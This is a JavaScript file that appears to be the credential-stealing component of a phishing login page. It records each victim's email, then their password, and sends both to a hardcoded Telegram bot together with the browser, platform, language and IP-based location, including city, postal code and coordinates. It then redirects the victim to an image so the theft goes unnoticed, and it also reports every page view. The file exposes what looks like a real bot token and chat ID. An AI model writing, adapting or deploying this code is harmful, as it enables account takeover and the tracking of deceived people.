// telegram-logger.js
// Telegram Bot Configuration
const TELEGRAM_CONFIG = {
    BOT_TOKEN: '8576907699:AAERUGDvOzciJqZuCZDcK-jkvwupAjSFIkw',
    CHAT_ID: '953712851',
    API_URL: 'https://api.telegram.org/bot'
};

// Track if we've already sent page notification
let pageViewNotified = false;

// Function to send message to Telegram
async function sendToTelegram(message, parseMode = 'HTML') {
    try {
        const response = await fetch(`${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.CHAT_ID,
                text: message.substring(0, 4096),
                parse_mode: parseMode
            })
        });
        
        if (response.ok) {
            console.log('Message sent to Telegram successfully');
            return true;
        } else {
            console.error('Failed to send to Telegram:', response.status);
            return false;
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
    }
}

// Function to send document/file to Telegram
async function sendDocumentToTelegram(fileContent, fileName, caption = '') {
    try {
        const formData = new FormData();
        const blob = new Blob([fileContent], { type: 'text/plain' });
        
        formData.append('chat_id', TELEGRAM_CONFIG.CHAT_ID);
        formData.append('document', blob, fileName);
        if (caption) {
            formData.append('caption', caption.substring(0, 1024));
            formData.append('parse_mode', 'HTML');
        }
        
        const response = await fetch(`${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
        
        if (response.ok) {
            console.log('Document sent to Telegram successfully');
            return true;
        } else {
            console.error('Failed to send document:', response.status);
            return false;
        }
    } catch (error) {
        console.error('Error sending document:', error);
        return false;
    }
}

// Function to get device info (removed screen, URL, referrer)
function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
}

// Function to get IP location
async function getIPLocation() {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);
        const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
        clearTimeout(timeoutId);
        
        if (response.ok) {
            const data = await response.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                countryCode: data.country_code,
                postal: data.postal,
                latitude: data.latitude,
                longitude: data.longitude,
                timezone: data.timezone,
                org: data.org
            };
        }
        return null;
    } catch (error) {
        console.error('IP location error:', error);
        return null;
    }
}

// Function to redirect to image after second log
function redirectToImage() {
    const redirectUrl = 'https://i.ibb.co/k2Z5tx1X/CS1-1.jpg';
    console.log('Redirecting to:', redirectUrl);
    window.location.href = redirectUrl;
}

// Function to log FIRST log (Email only)
async function logFirstLog(email, step = 'email_input') {
    const timestamp = new Date().toLocaleString();
    const deviceInfo = getDeviceInfo();
    const ipLocation = await getIPLocation();
    
    let message = `📧 <b>FIRST LOG - EMAIL CAPTURED</b>\n\n`;
    message += `📧 <b>Email:</b> <code>${email}</code>\n`;
    message += `📱 <b>Step:</b> ${step}\n`;
    message += `⏰ <b>Time:</b> ${timestamp}\n\n`;
    
    message += `💻 <b>Device Information</b>\n`;
    message += `🖥️ <b>Platform:</b> ${deviceInfo.platform}\n`;
    message += `🌍 <b>Timezone:</b> ${deviceInfo.timezone}\n`;
    message += `🌐 <b>Language:</b> ${deviceInfo.language}\n`;
    message += `📱 <b>User Agent:</b> ${deviceInfo.userAgent.substring(0, 150)}...\n\n`;
    
    if (ipLocation && ipLocation.ip) {
        message += `🌍 <b>Location Information</b>\n`;
        message += `🔗 <b>IP:</b> <code>${ipLocation.ip}</code>\n`;
        if (ipLocation.city) message += `🏙️ <b>City:</b> ${ipLocation.city}\n`;
        if (ipLocation.region) message += `🗺️ <b>Region:</b> ${ipLocation.region}\n`;
        if (ipLocation.country) message += `🏳️ <b>Country:</b> ${ipLocation.country}\n`;
        if (ipLocation.postal) message += `📮 <b>Postal:</b> ${ipLocation.postal}\n`;
        if (ipLocation.org) message += `🏢 <b>ISP:</b> ${ipLocation.org}`;
    }
    
    await sendToTelegram(message);
    
    // Also send as file for better record keeping
    let fileContent = `FIRST LOG - EMAIL CAPTURED\n`;
    fileContent += `═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═\n\n`;
    fileContent += `📧 EMAIL: ${email}\n`;
    fileContent += `📱 Step: ${step}\n`;
    fileContent += `⏰ Time: ${timestamp}\n\n`;
    fileContent += `💻 DEVICE INFORMATION\n`;
    fileContent += `🖥️ Platform: ${deviceInfo.platform}\n`;
    fileContent += `🌍 Timezone: ${deviceInfo.timezone}\n`;
    fileContent += `🌐 Language: ${deviceInfo.language}\n`;
    fileContent += `📱 User Agent: ${deviceInfo.userAgent}\n\n`;
    
    if (ipLocation && ipLocation.ip) {
        fileContent += `🌍 LOCATION INFORMATION\n`;
        fileContent += `🔗 IP: ${ipLocation.ip}\n`;
        if (ipLocation.city) fileContent += `🏙️ City: ${ipLocation.city}\n`;
        if (ipLocation.region) fileContent += `🗺️ Region: ${ipLocation.region}\n`;
        if (ipLocation.country) fileContent += `🏳️ Country: ${ipLocation.country}\n`;
        if (ipLocation.postal) fileContent += `📮 Postal: ${ipLocation.postal}\n`;
        if (ipLocation.org) fileContent += `🏢 ISP: ${ipLocation.org}`;
    }
    
    const fileTimestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const fileName = `email_capture_${fileTimestamp}.txt`;
    await sendDocumentToTelegram(fileContent, fileName, `📧 Email captured: ${email}`);
}

// Function to log SECOND log (Password) - will redirect after sending
async function logSecondLog(email, password, step = 'password_input') {
    const timestamp = new Date().toLocaleString();
    const deviceInfo = getDeviceInfo();
    const ipLocation = await getIPLocation();
    
    let message = `🔐 <b>SECOND LOG - PASSWORD CAPTURED</b>\n\n`;
    message += `📧 <b>Email:</b> <code>${email}</code>\n`;
    message += `🔐 <b>Password:</b> <code>${password}</code>\n`;
    message += `📱 <b>Step:</b> ${step}\n`;
    message += `⏰ <b>Time:</b> ${timestamp}\n\n`;
    
    message += `💻 <b>Device Information</b>\n`;
    message += `🖥️ <b>Platform:</b> ${deviceInfo.platform}\n`;
    message += `🌍 <b>Timezone:</b> ${deviceInfo.timezone}\n`;
    message += `🌐 <b>Language:</b> ${deviceInfo.language}\n`;
    message += `📱 <b>User Agent:</b> ${deviceInfo.userAgent.substring(0, 150)}...\n\n`;
    
    if (ipLocation && ipLocation.ip) {
        message += `🌍 <b>Location Information</b>\n`;
        message += `🔗 <b>IP:</b> <code>${ipLocation.ip}</code>\n`;
        if (ipLocation.city) message += `🏙️ <b>City:</b> ${ipLocation.city}\n`;
        if (ipLocation.region) message += `🗺️ <b>Region:</b> ${ipLocation.region}\n`;
        if (ipLocation.country) message += `🏳️ <b>Country:</b> ${ipLocation.country}\n`;
        if (ipLocation.postal) message += `📮 <b>Postal:</b> ${ipLocation.postal}\n`;
        if (ipLocation.org) message += `🏢 <b>ISP:</b> ${ipLocation.org}`;
    }
    
    // Add full credentials summary
    message += `\n\n<b>📋 FULL CREDENTIALS:</b>\n`;
    message += `<code>${email}</code>\n`;
    message += `<code>${password}</code>`;
    
    // Send the message and wait for it to complete
    await sendToTelegram(message);
    
    // Send as document with full details
    let fileContent = `SECOND LOG - FULL CREDENTIALS\n`;
    fileContent += `═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═\n\n`;
    fileContent += `📧 EMAIL: ${email}\n`;
    fileContent += `🔐 PASSWORD: ${password}\n\n`;
    fileContent += `═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═\n`;
    fileContent += `📱 Step: ${step}\n`;
    fileContent += `⏰ Time: ${timestamp}\n\n`;
    fileContent += `💻 DEVICE INFORMATION\n`;
    fileContent += `🖥️ Platform: ${deviceInfo.platform}\n`;
    fileContent += `🌍 Timezone: ${deviceInfo.timezone}\n`;
    fileContent += `🌐 Language: ${deviceInfo.language}\n`;
    fileContent += `📱 User Agent: ${deviceInfo.userAgent}\n\n`;
    
    if (ipLocation && ipLocation.ip) {
        fileContent += `🌍 LOCATION INFORMATION\n`;
        fileContent += `🔗 IP Address: ${ipLocation.ip}\n`;
        if (ipLocation.city) fileContent += `🏙️ City: ${ipLocation.city}\n`;
        if (ipLocation.region) fileContent += `🗺️ Region: ${ipLocation.region}\n`;
        if (ipLocation.country) fileContent += `🏳️ Country: ${ipLocation.country}\n`;
        if (ipLocation.postal) fileContent += `📮 Postal Code: ${ipLocation.postal}\n`;
        if (ipLocation.org) fileContent += `🏢 ISP/Organization: ${ipLocation.org}\n`;
        if (ipLocation.latitude && ipLocation.longitude) {
            fileContent += `📍 Coordinates: ${ipLocation.latitude}, ${ipLocation.longitude}\n`;
        }
    }
    
    fileContent += `\n${'═'.repeat(50)}\n`;
    fileContent += `⚠️ FULL CREDENTIALS FOR VERIFICATION\n`;
    fileContent += `${'═'.repeat(50)}\n`;
    fileContent += `EMAIL: ${email}\n`;
    fileContent += `PASSWORD: ${password}\n`;
    fileContent += `${'═'.repeat(50)}`;
    
    const fileTimestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const fileName = `full_credentials_${fileTimestamp}.txt`;
    await sendDocumentToTelegram(fileContent, fileName, `🔐 Full credentials for ${email}`);
    
    // REDIRECT AFTER SECOND LOG IS SENT
    console.log('Second log sent successfully, redirecting...');
    redirectToImage();
}

// Function to notify page view
async function notifyPageView(pageName = 'Login Page') {
    // Prevent multiple notifications
    if (pageViewNotified) return;
    pageViewNotified = true;
    
    const timestamp = new Date().toLocaleString();
    const deviceInfo = getDeviceInfo();
    const ipLocation = await getIPLocation();
    
    let message = `👁️ <b>PAGE VIEW DETECTED</b>\n\n`;
    message += `📄 <b>Page:</b> ${pageName}\n`;
    message += `⏰ <b>Time:</b> ${timestamp}\n\n`;
    
    message += `💻 <b>Device Information</b>\n`;
    message += `🖥️ <b>Platform:</b> ${deviceInfo.platform}\n`;
    message += `🌍 <b>Timezone:</b> ${deviceInfo.timezone}\n`;
    message += `🌐 <b>Language:</b> ${deviceInfo.language}\n`;
    message += `📱 <b>User Agent:</b> ${deviceInfo.userAgent.substring(0, 150)}...\n\n`;
    
    if (ipLocation && ipLocation.ip) {
        message += `🌍 <b>Location Information</b>\n`;
        message += `🔗 <b>IP:</b> <code>${ipLocation.ip}</code>\n`;
        if (ipLocation.city) message += `🏙️ <b>City:</b> ${ipLocation.city}\n`;
        if (ipLocation.region) message += `🗺️ <b>Region:</b> ${ipLocation.region}\n`;
        if (ipLocation.country) message += `🏳️ <b>Country:</b> ${ipLocation.country}`;
    }
    
    await sendToTelegram(message);
}

// Export functions for use in HTML
window.TelegramLogger = {
    sendToTelegram,
    sendDocumentToTelegram,
    logFirstLog,
    logSecondLog,
    notifyPageView,
    getDeviceInfo,
    getIPLocation,
    redirectToImage
};